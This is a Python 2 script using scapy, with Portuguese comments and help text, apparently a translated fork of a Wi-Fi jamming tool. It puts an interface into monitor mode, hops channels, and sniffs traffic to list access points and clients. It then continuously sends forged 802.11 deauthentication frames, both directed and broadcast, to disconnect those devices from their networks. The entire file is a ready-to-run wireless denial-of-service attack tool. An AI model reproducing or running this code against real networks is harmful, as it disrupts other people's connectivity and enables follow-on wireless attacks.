#!/usr/bin/env python

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
conf.verb = 0
import os
import sys
import time
from threading import Thread, Lock
from subprocess import Popen, PIPE
from signal import SIGINT, signal
import argparse
import socket
import struct
import fcntl

# 
W  = '\033[0m'  # branco (normal)
R  = '\033[31m' # vermelho
G  = '\033[32m' # verde
O  = '\033[33m' # laranja
B  = '\033[34m' # azul
P  = '\033[35m' # roxo
C  = '\033[36m' # azul_claro
GR = '\033[37m' # cinza
T  = '\033[93m' # laranja_claro

def parse_args():
	#Criando argumentos
    parser = argparse.ArgumentParser()

    parser.add_argument("-s", "--skip", help="Pular desautenticacao no endereco MAC. Ex: -s 00:11:BB:33:44:AA")
    parser.add_argument("-i", "--interface", help="Escolha a interface de monitoramento, por padrao, o script escolhera a mais potente. Ex: -i mon5")
    parser.add_argument("-c", "--channel", help="Observar e desconectar clientes somente no canal especifico. Ex: -c 6")
    parser.add_argument("-m", "--maximum", help="Escolha o maximo de clientes a serem desconectados. Ex: -m 5")
    parser.add_argument("-n", "--noupdate", help="Nao remover a lista de clientes desconectados(-m) quando checar ao limite. Deve ser usado junto com o -m. Ex: -m 10 -n", action='store_true')
    parser.add_argument("-t", "--timeinterval", help="Defina o tempo do intervalo que os pacotes sao enviados. Por padrao, sao enviados no tempo mais rapido que puder. Se aparecer erros tipo 'no buffer space' tente: -t .00001")
    parser.add_argument("-p", "--packets", help="Defina a quantidade de pacotes a serem enviados a cada rajada. Padrao 1; 1 pacote para o cliente e outro para o AP. Envie 2 para o cliente e 2 para o AP: -p 2")
    parser.add_argument("-d", "--directedonly", help="Esquecer o endereco Broadcast e focar somente no cliente/AP", action='store_true')
    parser.add_argument("-a", "--accesspoint", help="Especifique um endereco MAC para atacar")
    parser.add_argument("--world", help="Por padrao, atacamos ate o canal 11, esta opcao chegamos ate o canal 13", action="store_true")

    return parser.parse_args()


########################################
# Inicio de manipulacao de interface
########################################

def get_mon_iface(args):
    global monitor_on
    monitors, interfaces = iwconfig()
    if args.interface:
        monitor_on = True
        return args.interface
    if len(monitors) > 0:
        monitor_on = True
        return monitors[0]
    else:
        # Iniciar monitoramento na interface
        print '['+G+'+'+W+'] Procurando a interface mais forte...'
        interface = get_iface(interfaces)
        monmode = start_mon_mode(interface)
        return monmode

def iwconfig():
    monitors = []
    interfaces = {}
    try:
        proc = Popen(['iwconfig'], stdout=PIPE, stderr=DN)
    except OSError:
        sys.exit('['+R+'-'+W+'] Falha ao executar o "iwconfig"')
    for line in proc.communicate()[0].split('\n'):
        if len(line) == 0: continue
        if line[0] != ' ':
            wired_search = re.search('eth[0-9]|em[0-9]|p[1-9]p[1-9]', line)
            if not wired_search: 
                iface = line[:line.find(' ')]
                if 'Mode:Monitor' in line:
                    monitors.append(iface)
                elif 'IEEE 802.11' in line:
                    if "ESSID:\"" in line:
                        interfaces[iface] = 1
                    else:
                        interfaces[iface] = 0
    return monitors, interfaces

def get_iface(interfaces):
    scanned_aps = []

    if len(interfaces) < 1:
        sys.exit('['+R+'-'+W+'] Nao foi encontrado nenhuma rede Wireless, ative uma e tente novamente')
    if len(interfaces) == 1:
        for interface in interfaces:
            return interface

    # Buscar interface mais forte
    for iface in interfaces:
        count = 0
        proc = Popen(['iwlist', iface, 'scan'], stdout=PIPE, stderr=DN)
        for line in proc.communicate()[0].split('\n'):
            if ' - Address:' in line:
               count += 1
        scanned_aps.append((count, iface))
        print '['+G+'+'+W+'] Internetes descobertas '+G+iface+W+': '+T+str(count)+W
    try:
        interface = max(scanned_aps)[1]
        return interface
    except Exception as e:
        for iface in interfaces:
            interface = iface
            print '['+R+'-'+W+'] Minor error:',e
            print '    Iniciamento modo de monitoramento LIGADO '+G+interface+W
            return interface

def start_mon_mode(interface):
    print '['+G+'+'+W+'] Iniciando modo de monitoramento DESLIGADO '+G+interface+W
    try:
        os.system('ifconfig %s down' % interface)
        os.system('iwconfig %s mode monitor' % interface)
        os.system('ifconfig %s up' % interface)
        return interface
    except Exception:
        sys.exit('['+R+'-'+W+'] Falha ao iniciar modo de monitoramento')

def remove_mon_iface(mon_iface):
    os.system('ifconfig %s down' % mon_iface)
    os.system('iwconfig %s mode managed' % mon_iface)
    os.system('ifconfig %s up' % mon_iface)

def mon_mac(mon_iface):
    '''
    http://stackoverflow.com/questions/159137/getting-mac-address
    '''
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', mon_iface[:15]))
    mac = ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]
    print '['+G+'*'+W+'] Monitor mode: '+G+mon_iface+W+' - '+O+mac+W
    return mac

########################################
# Fim da manipulacao da interface
########################################


def channel_hop(mon_iface, args):
    '''
    First time it runs through the channels it stays on each channel for 5 seconds
    in order to populate the deauth list nicely. After that it goes as fast as it can
    '''
    global monchannel, first_pass

    channelNum = 0
    maxChan = 11 if not args.world else 13
    err = None

    while 1:
        if args.channel:
            with lock:
                monchannel = args.channel
        else:
            channelNum +=1
            if channelNum > maxChan:
                channelNum = 1
                with lock:
                    first_pass = 0
            with lock:
                monchannel = str(channelNum)

            try:
                proc = Popen(['iw', 'dev', mon_iface, 'set', 'channel', monchannel], stdout=DN, stderr=PIPE)
            except OSError:
                print '['+R+'-'+W+'] Falha ao executar o "iw"'
                os.kill(os.getpid(),SIGINT)
                sys.exit(1)
            for line in proc.communicate()[1].split('\n'):
                if len(line) > 2: # iw dev nao deve ser mostrado, somente se houver erros
                    err = '['+R+'-'+W+'] Falha ao mudar de canal: '+R+line+W

        output(err, monchannel)
        if args.channel:
            time.sleep(.05)
        else:
            # Pular o primeiro canal sem desautenticar
            if first_pass == 1:
                time.sleep(1)
                continue

        deauth(monchannel)


def deauth(monchannel):
    pkts = []

    if len(clients_APs) > 0:
        with lock:
            for x in clients_APs:
                client = x[0]
                ap = x[1]
                ch = x[2]
                if ch == monchannel:
                    deauth_pkt1 = Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Deauth()
                    deauth_pkt2 = Dot11(addr1=ap, addr2=client, addr3=client)/Dot11Deauth()
                    pkts.append(deauth_pkt1)
                    pkts.append(deauth_pkt2)
    if len(APs) > 0:
        if not args.directedonly:
            with lock:
                for a in APs:
                    ap = a[0]
                    ch = a[1]
                    if ch == monchannel:
                        deauth_ap = Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=ap, addr3=ap)/Dot11Deauth()
                        pkts.append(deauth_ap)

    if len(pkts) > 0:
        # prevenindo 'no buffer space' erro no scapy http://goo.gl/6YuJbI
        if not args.timeinterval:
            args.timeinterval = 0
        if not args.packets:
            args.packets = 1

        for p in pkts:
            send(p, inter=float(args.timeinterval), count=int(args.packets))

def output(err, monchannel):
    os.system('clear')
    if err:
        print err
    else:
        print '['+R+'t'+G+'Byte'+W+'] '+mon_iface+' canal: '+G+monchannel+W+'\n'
    if len(clients_APs) > 0:
        print '                  Desautenticando            ch   ESSID'
    # Print lista deauth
    with lock:
        for ca in clients_APs:
            if len(ca) > 3:
                print '['+T+'*'+W+'] '+O+ca[0]+W+' - '+O+ca[1]+W+' - '+ca[2].ljust(2)+' - '+T+ca[3]+W
            else:
                print '['+T+'*'+W+'] '+O+ca[0]+W+' - '+O+ca[1]+W+' - '+ca[2]
    if len(APs) > 0:
        print '\n      Access Points     ch   ESSID'
    with lock:
        for ap in APs:
            print '['+T+'*'+W+'] '+O+ap[0]+W+' - '+ap[1].ljust(2)+' - '+T+ap[2]+W
    print ''

def noise_filter(skip, addr1, addr2):
    # Broadcast, broadcast, IPv6mcast, spanning tree, spanning tree, multicast, broadcast
    ignore = ['ff:ff:ff:ff:ff:ff', '00:00:00:00:00:00', '33:33:00:', '33:33:ff:', '01:80:c2:00:00:00', '01:00:5e:', mon_MAC]
    if skip:
        ignore.append(skip)
    for i in ignore:
        if i in addr1 or i in addr2:
            return True

def cb(pkt):
    global clients_APs, APs

    if args.maximum:
        if args.noupdate:
            if len(clients_APs) > int(args.maximum):
                return
        else:
            if len(clients_APs) > int(args.maximum):
                with lock:
                    clients_APs = []
                    APs = []

    if pkt.haslayer(Dot11):
        if pkt.addr1 and pkt.addr2:

            # Filtrando outros AP e Clientes caso pergunte
            if args.accesspoint:
                if args.accesspoint not in [pkt.addr1, pkt.addr2]:
                    return

            # Checando se foi adicionado a lista de AP
            if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                APs_add(clients_APs, APs, pkt, args.channel, args.world)

            # Ignorando ruidos
            if noise_filter(args.skip, pkt.addr1, pkt.addr2):
                return

            # Management = 1, data = 2
            if pkt.type in [1, 2]:
                clients_APs_add(clients_APs, pkt.addr1, pkt.addr2)

def APs_add(clients_APs, APs, pkt, chan_arg, world_arg):
    ssid       = pkt[Dot11Elt].info
    bssid      = pkt[Dot11].addr3
    try:
        # Thanks to airoscapy for below
        ap_channel = str(ord(pkt[Dot11Elt:3].info))
        if args.world == 'True':
            chans = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13']
        else:
            chans = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11']
        if ap_channel not in chans:
            return

        if chan_arg:
            if ap_channel != chan_arg:
                return

    except Exception as e:
        return

    if len(APs) == 0:
        with lock:
            return APs.append([bssid, ap_channel, ssid])
    else:
        for b in APs:
            if bssid in b[0]:
                return
        with lock:
            return APs.append([bssid, ap_channel, ssid])

def clients_APs_add(clients_APs, addr1, addr2):
    if len(clients_APs) == 0:
        if len(APs) == 0:
            with lock:
                return clients_APs.append([addr1, addr2, monchannel])
        else:
            AP_check(addr1, addr2)

    # Criando lista de Clientes/Ap caso ainda nao exista
    else:
        for ca in clients_APs:
            if addr1 in ca and addr2 in ca:
                return

        if len(APs) > 0:
            return AP_check(addr1, addr2)
        else:
            with lock:
                return clients_APs.append([addr1, addr2, monchannel])

def AP_check(addr1, addr2):
    for ap in APs:
        if ap[0].lower() in addr1.lower() or ap[0].lower() in addr2.lower():
            with lock:
                return clients_APs.append([addr1, addr2, ap[1], ap[2]])

def stop(signal, frame):
    if monitor_on:
        sys.exit('\n['+R+'!'+W+'] Fechando')
    else:
        remove_mon_iface(mon_iface)
        sys.exit('\n['+R+'!'+W+'] Fechando')

if __name__ == "__main__":
    if os.geteuid():
        sys.exit('['+R+'-'+W+'] Execute como Root')
    clients_APs = []
    APs = []
    DN = open(os.devnull, 'w')
    lock = Lock()
    args = parse_args()
    monitor_on = None
    mon_iface = get_mon_iface(args)
    conf.iface = mon_iface
    mon_MAC = mon_mac(mon_iface)
    first_pass = 1

    # Pulando os canais
    hop = Thread(target=channel_hop, args=(mon_iface, args))
    hop.daemon = True
    hop.start()

    signal(SIGINT, stop)

    try:
       sniff(iface=mon_iface, store=0, prn=cb)
    except Exception as msg:
        remove_mon_iface(mon_iface)
        print '\n['+R+'!'+W+'] Fechando'
        sys.exit(0)